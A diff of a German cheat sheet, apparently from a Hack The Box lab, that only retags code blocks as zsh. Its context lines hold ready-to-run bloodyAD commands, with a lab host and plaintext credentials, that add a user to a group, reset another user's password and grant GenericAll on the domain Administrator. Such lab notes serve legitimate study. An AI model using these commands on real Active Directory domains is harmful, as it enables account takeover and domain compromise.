@@ -15,7 +15,7 @@ bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' 
 
 Zeigt die Zugriffsrechte (ACLs) auf das Gruppenobjekt $group_name im Active Directory. 
 Anhand der Rechte kann dann die Mitgliedschaft hinzugefügt werden, sofern GenericAll, WriteProperty, WriteDACL etc. vorhanden sind.
-```
+```zsh
 bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' get writeable 
 bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james
 ```
@@ -25,7 +25,7 @@ bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' 
 🧩 **Change Password**
 
 Fragt mit bloodyAD die Zugriffssteuerungsliste (ACL) eines Active Directory-Objekts und anschließend wird das Passwort vom Zielobjekt geändert, sofern Berechtigungen vorhanden sind.
-```
+```zsh
 bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' get writeable 
 bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' set password $target_username $new_password
 ```
@@ -36,6 +36,6 @@ bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' 
 
 Versucht, dem Benutzer Levi.James die GenericAll-Berechtigung auf das AD-Objekt mit dem Distinguished Name Administrator zu geben.
 "Füge der Access Control List (ACL) des Administrator-Objekts hinzu, dass levi.james volle Rechte bekommt.“
-```
+```zsh
 bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' add genericAll "CN=Administrator,CN=Users,DC=puppy,DC=htb" levi.james
 ```
